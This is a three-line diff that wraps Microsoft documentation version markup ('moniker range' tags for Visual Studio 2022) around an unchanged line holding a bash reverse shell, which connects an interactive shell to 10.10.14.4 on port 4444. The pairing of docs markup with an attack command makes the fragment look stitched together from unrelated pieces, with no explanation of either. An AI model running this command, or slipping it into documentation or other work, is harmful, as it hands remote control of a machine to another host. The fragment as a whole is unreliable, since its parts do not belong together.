@@ -1,1 +1,3 @@
+::: moniker range=">=vs-2022"
 sh -i >& /dev/tcp/10.10.14.4/4444 0>&1
+::: moniker-end
